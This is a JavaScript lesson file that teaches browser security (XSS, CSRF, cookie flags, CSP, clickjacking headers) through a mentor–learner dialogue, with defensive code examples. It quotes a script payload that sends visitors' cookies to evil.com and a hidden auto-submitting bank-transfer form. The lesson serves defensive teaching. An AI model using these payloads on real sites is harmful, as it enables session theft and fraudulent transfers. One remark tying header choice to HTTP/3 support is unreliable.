// ─────────────────────────────────────────────────────────────────
//  LESSON: Browser Security
//  Category: Security & Production Operations
// ─────────────────────────────────────────────────────────────────

const LESSON_BROWSER_SECURITY = {
  category: "Security & Production Operations",
  tag: "Browser Security",
  title: "XSS, CSRF, and Why the Browser Is Your Last Line of Defence",
  intro: "Raj slides his laptop across. There's a comment thread open — a tech forum. The top comment is just: <code>&lt;script&gt;document.location='https://evil.com?c='+document.cookie&lt;/script&gt;</code>. 'That was posted to our staging app three hours ago,' he says quietly. 'Before we added sanitisation. Walk me through what just happened to every user who loaded that page.'",
  scenes: [

    // ── XSS ──
    {
      speaker: "raj",
      text: `"Start with what that script actually does once it runs in a victim's browser."`
    },
    {
      speaker: "you",
      text: `"Reads their cookies and sends them to the attacker's server."`
    },
    {
      speaker: "raj",
      text: `"What else could it do? What's the full capability of injected JavaScript?"`
    },
    {
      speaker: "you",
      text: `"Read localStorage... make API requests on their behalf?"`
    },
    {
      speaker: "raj",
      text: `"Everything. Injected script runs in your origin's security context. It has the same trust level as your own code. It can read cookies, read localStorage — which is where most SPAs store their JWTs. It can make fetch requests to your API with the user's session attached. It can log every keystroke. It can silently rewrite the DOM — change the account number on a transfer confirmation page. It can redirect to a phishing clone. The reason XSS exists at all is that the browser can't tell your code apart from the attacker's code — once it's running in your origin, it's trusted."`
    },
    {
      type: "analogy",
      text: "XSS is a forged letter slipped inside a real envelope. The recipient trusts the envelope — it came from someone they know. They don't inspect each sentence for authenticity. The forged content has the same authority as the real content because it arrived through the same trusted channel."
    },
    {
      speaker: "raj",
      text: `"Three types of XSS. You just described stored. What are the other two?"`
    },
    {
      speaker: "you",
      text: `"Reflected — the payload is in the URL and the server echoes it back into the HTML. And DOM-based — the client-side JavaScript processes attacker-controlled input and writes it to the page without going to the server at all."`
    },
    {
      speaker: "raj",
      text: `"Good. Stored is the worst because one injected payload hits every user who loads the page. Reflected needs a crafted link — the attacker tricks a specific person into clicking it. DOM-based is the sneaky one. The server never sees the payload — it lives in the URL fragment or query string, processed entirely by your frontend JavaScript. Modern frameworks like React protect you from stored and reflected XSS by default because they escape everything before writing to the DOM. DOM-based is still entirely your problem. Any time you touch innerHTML, document.write, or eval with user-controlled data, you've punched a hole through the framework's protection yourself."`
    },
    {
      type: "code",
      text: `// ─────────────────────────────────────────────────────
// XSS — THREE TYPES AND HOW TO STOP EACH
// ─────────────────────────────────────────────────────

// ── Stored XSS ──
// Attacker posts to comments: <script>fetch('https://evil.com?c='+document.cookie)</script>
// Saved to DB. Every user who loads the comments page executes it.
// Fix: escape before rendering. Most template engines do this by default:
//   Handlebars: {{comment}}  ← escaped        {{{comment}}}  ← raw (dangerous)
//   EJS:        <%= comment %> ← escaped       <%- comment %> ← raw (dangerous)

// ── Reflected XSS ──
// Attacker crafts: https://yourapp.com/search?q=<script>stealCookies()</script>
// Server renders: <p>Results for: <script>stealCookies()</script></p>
// Fix: same — escape all user input before inserting into HTML

// ── DOM-based XSS ──
// Payload lives in URL fragment — server never sees it
const query = new URLSearchParams(window.location.search).get('msg');
document.getElementById('notice').innerHTML = query;  // ← NEVER. DO. THIS.

// Safe alternatives — the framework does the right thing:
document.getElementById('notice').textContent = query;   // auto-escaped
element.setAttribute('data-msg', query);                 // safe for attributes

// In React: the escape hatch that re-enables XSS risk:
<div dangerouslySetInnerHTML={{ __html: userContent }} />  // opt-in XSS risk
// In Vue:   <p v-html="userContent"></p>                  // opt-in XSS risk
// These exist for a reason — but require sanitisation first

// ── When you genuinely need to render user HTML (rich text editors) ──
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(userContent, {
  ALLOWED_TAGS:  ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
  ALLOWED_ATTR:  ['href', 'title'],
  FORBID_ATTR:   ['style', 'onerror', 'onload'],   // block event handlers
});
element.innerHTML = clean;`
    },

    // ── CSRF ──
    {
      speaker: "raj",
      text: `"Different attack. CSRF. How does it work?"`
    },
    {
      speaker: "you",
      text: `"A malicious site tricks the user's browser into making a request to your site. The browser sends their session cookie automatically, so your server thinks it's legitimate."`
    },
    {
      speaker: "raj",
      text: `"The key insight: the attacker never sees the cookie. They don't need to steal it. They just need the browser to use it. If you're logged into your bank and you visit evil.com, evil.com can have a hidden form that submits to yourbank.com/transfer. Your browser sends the session cookie. The bank sees a valid authenticated request and processes the transfer. Walk me through why CSRF tokens stop this."`
    },
    {
      speaker: "you",
      text: `"Because the attacker can't read the token from your page — Same-Origin Policy blocks cross-origin reads. So they can't include a valid token in their forged request."`
    },
    {
      speaker: "raj",
      text: `"Exactly. The token is in the DOM or a response header — somewhere the server can verify it — but the attacker's page on evil.com can't read it. They can trigger a request but they can't forge a valid one. Now — can CSRF tokens stop XSS?"`
    },
    {
      speaker: "you",
      text: `"No. Because XSS runs in your origin, so it can read the token from the DOM and include it."`
    },
    {
      speaker: "raj",
      text: `"Right. XSS defeats CSRF tokens completely. If an attacker has XSS, they have everything. This is why output escaping is more fundamental than CSRF protection. Fix XSS first."`
    },
    {
      type: "analogy",
      text: "CSRF is a puppet master. They don't pretend to be you — they make you act. You're already logged into the bank. The attacker pulls a string and your hand moves — a transfer happens. Your credentials were never stolen. You were just made to perform an action you didn't intend."
    },
    {
      type: "code",
      text: `// ─────────────────────────────────────────────────────
// CSRF — HOW IT WORKS AND HOW TO STOP IT
// ─────────────────────────────────────────────────────

// ── The attack ──
// evil.com loads this silently:
// &lt;form action="https://yourbank.com/transfer" method="POST"&gt;
//   &lt;input name="amount" value="9999"&gt;
//   &lt;input name="to"     value="attacker-account"&gt;
// &lt;/form&gt;
// &lt;script&gt;document.forms[0].submit()&lt;/script&gt;
//
// Browser auto-sends yourbank.com session cookie → transfer executes

// ── Defence 1: CSRF tokens ──
const csrf = require('csurf');
app.use(csrf({ cookie: { httpOnly: true, sameSite: 'strict' } }));

app.get('/transfer', (req, res) => {
  res.render('transfer', { csrfToken: req.csrfToken() });
  // Template: <input type="hidden" name="_csrf" value="<%= csrfToken %>">
});
// csurf validates the token on every POST — attacker can't read it cross-origin

// ── Defence 2: SameSite cookies (modern, usually sufficient) ──
res.cookie('sessionId', token, {
  httpOnly: true,
  secure:   true,
  sameSite: 'lax',    // not sent on cross-site POST — CSRF impossible for forms
  maxAge:   7 * 24 * 60 * 60 * 1000,
});
// SameSite=strict: cookie never sent cross-site (even on link navigation)
// SameSite=lax:    not sent on cross-site POST/embed, but sent when user clicks a link
// SameSite=none:   always sent (legacy behaviour, needs Secure flag)

// ── Defence 3: Custom header check for APIs ──
// Browsers can't set custom headers cross-origin without a CORS preflight
// So requiring a custom header means form-based CSRF attacks are blocked
app.use('/api', (req, res, next) => {
  if (req.method !== 'GET' && !req.headers['x-requested-with']) {
    return res.status(403).json({ error: 'Missing CSRF header' });
  }
  next();
});`
    },

    // ── Cookie flags ──
    {
      speaker: "raj",
      text: `"Cookie flags. httpOnly, Secure, SameSite. What does each one actually protect?"`
    },
    {
      speaker: "you",
      text: `"httpOnly stops JavaScript from reading the cookie. Secure means HTTPS only. SameSite controls whether the browser sends it on cross-site requests."`
    },
    {
      speaker: "raj",
      text: `"What does httpOnly not protect you from?"`
    },
    {
      speaker: "you",
      text: `"CSRF — the browser still sends the cookie automatically on requests, it just can't be read by JS."`
    },
    {
      speaker: "raj",
      text: `"And what does SameSite not protect you from?"`
    },
    {
      speaker: "you",
      text: `"XSS — if an attacker has code running in your origin, the Same-Origin restrictions don't apply."`
    },
    {
      speaker: "raj",
      text: `"These are layers. None of them alone is sufficient. A hardened session cookie needs all three: httpOnly so XSS can't steal it via document.cookie, Secure so it only travels over TLS, SameSite so it's not sent on cross-site requests. They protect against different attacks. Don't pick one and call it done."`
    },
    {
      type: "code",
      text: `// ─────────────────────────────────────────────────────
// COOKIE FLAGS — WHAT EACH STOPS (AND DOESN'T)
// ─────────────────────────────────────────────────────

// httpOnly
//   Stops: document.cookie read — XSS can't steal the token value
//   Doesn't stop: browser sending the cookie automatically (CSRF still works)

// Secure
//   Stops: cookie sent over plain HTTP (interceptable by network observer)
//   Doesn't stop: XSS (JS can still call document.cookie if not httpOnly), CSRF

// SameSite=strict
//   Stops: cookie sent on ALL cross-site requests (forms, XHR, navigation)
//   Doesn't stop: XSS
//   Side effect: breaks OAuth flows, payment redirects, any cross-site navigation

// SameSite=lax   (the practical choice for most apps)
//   Stops: cookie sent on cross-site POST/embed (blocks form-based CSRF)
//   Allows: cookie sent when user clicks a link to your site from elsewhere
//   Best for: regular apps where users arrive via links and need to be logged in

// ── Hardened session cookie ──
res.cookie('session', token, {
  httpOnly: true,
  secure:   true,
  sameSite: 'lax',
  maxAge:   7 * 24 * 60 * 60 * 1000,
  path:     '/',
  // Omit 'domain' — without it, cookie only goes to the exact domain (not subdomains)
  // Setting domain: '.example.com' would send it to all subdomains
});

// ── Cookies vs localStorage for auth tokens ──
// localStorage: readable by ALL JavaScript in your origin
//               → XSS immediately gets your JWT, no mitigations possible
//               → immune to CSRF (not sent automatically)
// httpOnly cookie: unreadable by JavaScript
//               → XSS can't steal the token, only use it (and CSP limits that)
//               → needs SameSite for CSRF protection
// For sensitive tokens: httpOnly cookie wins.`
    },

    // ── CSP ──
    {
      speaker: "raj",
      text: `"You fix the sanitisation bug. The comment is now escaped. But I want another layer — something that means even if we miss an XSS vulnerability in the future, the damage is limited. What is it?"`
    },
    {
      speaker: "you",
      text: `"Content Security Policy."`
    },
    {
      speaker: "raj",
      text: `"What exactly does it do?"`
    },
    {
      speaker: "you",
      text: `"It tells the browser which sources are allowed to load scripts. Even if an attacker injects a script tag, if it doesn't come from an allowed source the browser refuses to run it."`
    },
    {
      speaker: "raj",
      text: `"And which directive matters most?"`
    },
    {
      speaker: "you",
      text: `"script-src. Set it to 'self' and only scripts from your own origin run."`
    },
    {
      speaker: "raj",
      text: `"Right. And the one that catches developers by surprise when they first add a CSP?"`
    },
    {
      speaker: "you",
      text: `"Inline scripts are blocked too. onclick attributes, script tags with no src, anything inline."`
    },
    {
      speaker: "raj",
      text: `"Yes. And eval. And javascript: URLs. That's good — those are all classic XSS delivery vehicles. If you have legitimate inline scripts, use a nonce: a random value generated per request, put in the CSP header and as an attribute on the script tag. The injected script won't have it. Your real script will. One more thing — deploy in report-only mode first. If you just ship a strict CSP without testing it, you'll probably break your own app. Report-only sends violation reports without actually blocking anything."`
    },
    {
      type: "code",
      text: `// ─────────────────────────────────────────────────────
// CONTENT SECURITY POLICY
// ─────────────────────────────────────────────────────

// CSP is your safety net after output escaping.
// Escaping is primary defence. CSP is "even if we miss one..."

const crypto = require('crypto');

app.use((req, res, next) => {
  // Fresh nonce per request — injected scripts won't have it
  res.locals.nonce = crypto.randomBytes(16).toString('base64');

  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",
    \`script-src 'self' 'nonce-\${res.locals.nonce}'\`,  // inline scripts need nonce
    "style-src 'self' 'unsafe-inline'",                 // inline styles (lower risk)
    "img-src 'self' data: https://cdn.example.com",
    "connect-src 'self' https://api.example.com",       // fetch/XHR targets
    "font-src 'self' https://fonts.gstatic.com",
    "frame-ancestors 'none'",        // nobody can iframe your app (clickjacking)
    "upgrade-insecure-requests",     // rewrite http:// → https:// automatically
  ].join('; '));

  next();
});

// In your template — legitimate inline script gets the nonce:
// <script nonce="<%= nonce %>">initApp();</script>
// Any injected <script> without the nonce → browser silently blocks it

// ── Start with Report-Only to avoid breaking your app ──
res.setHeader(
  'Content-Security-Policy-Report-Only',
  "default-src 'self'; report-uri /csp-violations"
);

app.post('/csp-violations', express.json({ type: 'application/csp-report' }), (req, res) => {
  logger.warn({ event: 'csp_violation', report: req.body['csp-report'] });
  res.status(204).end();
});
// Run in report-only for a week. Fix violations. Then switch to enforcement.

// ── The four CSP mistakes that defeat it entirely ──
// 'unsafe-inline' on script-src  → allows all inline scripts, XSS fully works again
// 'unsafe-eval'   on script-src  → eval() works, XSS payloads love eval
// '*' as origin                  → any domain can serve scripts
// http: scheme in script-src     → MITM can swap any script in transit`
    },

    // ── Clickjacking and security headers ──
    {
      speaker: "raj",
      text: `"One more attack. I build a page. Transparent iframe over it. User thinks they're clicking 'Win a prize' but they're actually clicking 'Confirm transfer' on your site underneath. What stops it?"`
    },
    {
      speaker: "you",
      text: `"X-Frame-Options: DENY. Or CSP's frame-ancestors directive."`
    },
    {
      speaker: "raj",
      text: `"Which one do you use?"`
    },
    {
      speaker: "you",
      text: `"frame-ancestors in CSP is the modern one — more flexible, you can allow specific origins. X-Frame-Options is older but has broader support."`
    },
    {
      speaker: "raj",
      text: `"Use both for now until HTTP/3 CDN support is universal. And the old JavaScript frame-busting trick — if (window.top !== window.self) reload — is bypassable. The iframe sandbox attribute blocks top-level navigation. Headers are enforced by the browser before your JavaScript runs. Always headers for clickjacking."`
    },
    {
      type: "code",
      text: `// ─────────────────────────────────────────────────────
// SECURITY HEADERS — THE FULL SET
// ─────────────────────────────────────────────────────

// Helmet.js sets all of these with good defaults in one line:
const helmet = require('helmet');
app.use(helmet());

// ── What Helmet adds and why ──

// Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
//   → Force HTTPS for 1 year on all subdomains
//   → Without it: the VERY FIRST HTTP request is vulnerable to MITM
//   → With preload: even the first-ever request is HTTPS (browser preload list)

// X-Frame-Options: DENY
//   → Nobody can embed your app in an iframe
//   → Blocks clickjacking
//   → CSP frame-ancestors 'none' is the modern equivalent

// X-Content-Type-Options: nosniff
//   → Browser must use the declared Content-Type, not sniff from content
//   → Stops MIME confusion: someone uploads a .jpg that's actually a script

// Referrer-Policy: strict-origin-when-cross-origin
//   → Full URL sent in Referer on same-origin, only the origin cross-origin
//   → Prevents leaking sensitive URL parameters (reset tokens, IDs) to third parties

// Permissions-Policy: geolocation=(), microphone=(), camera=()
//   → Opt out of browser features your app doesn't use
//   → Limits blast radius if attacker gets JS execution

// ── Helmet custom config ──
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc:     ["'self'"],
      scriptSrc:      ["'self'"],
      frameAncestors: ["'none'"],
    },
  },
  hsts: {
    maxAge:            31536000,
    includeSubDomains: true,
    preload:           true,
  },
}));`
    },

    // ── Closing ──
    {
      speaker: "raj",
      text: `"Back to the comment in the thread. You now know what happened. Walk me through every layer that failed — and what would have stopped the attack at each one."`
    },
    {
      speaker: "you",
      text: `"The comment was stored to the DB without sanitisation — that's where escaping would have stopped it. When it rendered, the script ran in every visitor's origin — output escaping on render would have stopped it there. The script read document.cookie — httpOnly on the session cookie means that call returns nothing. The script exfiltrated the cookie — CSP connect-src would have blocked the fetch to evil.com. And if somehow the attacker then tried to use that cookie from another origin for CSRF, SameSite=Lax stops the cookie being sent cross-site."`
    },
    {
      speaker: "raj",
      text: `"Five layers. The attack succeeded because layer one was missing. But that's the point of defence in depth — you don't get to rely on layer one being perfect. Escaping is your primary defence. Everything else is 'even if'. Most real attacks exploit a single missing layer, not five simultaneous failures. Add them all."`
    },

    {
      type: "summary",
      points: [
        "XSS injects JavaScript into your page. Injected code runs with full origin trust — same access as your own code. Cookies, localStorage, API requests, keystrokes, DOM manipulation — all of it.",
        "Three XSS types: stored (DB → all users, worst), reflected (URL echo → crafted link), DOM-based (client-side only, framework protection doesn't apply — watch innerHTML and location.hash).",
        "CSRF doesn't steal credentials — it makes the browser use them. The attacker triggers a request; the browser sends the cookie automatically. It only works for state-changing actions, not reads.",
        "XSS defeats CSRF tokens — injected script can read the token from the DOM. Fix XSS first. CSRF protection is the second layer, not the first.",
        "Cookie flags are layers, not alternatives: httpOnly (JS can't read it), Secure (HTTPS only), SameSite=Lax (not sent on cross-site POST). All three together for session cookies.",
        "httpOnly cookies are safer than localStorage for auth tokens — even if XSS runs, it can't read the token value. localStorage is fully readable by any JavaScript in your origin.",
        "CSP is your 'even if' layer after output escaping. script-src 'self' blocks injected scripts. Use nonces for legitimate inline scripts. Deploy in Report-Only mode first — a strict CSP on an untested app will break things.",
        "Clickjacking: attacker overlays a transparent iframe. JavaScript frame-busting is bypassable via the sandbox attribute. Use headers: X-Frame-Options: DENY and CSP frame-ancestors: 'none'.",
        "Defence in depth: output escaping → httpOnly → CSP blocks execution → CSP connect-src blocks exfiltration → SameSite stops cross-site cookie use. Most attacks exploit one missing layer."
      ]
    }
  ]
};
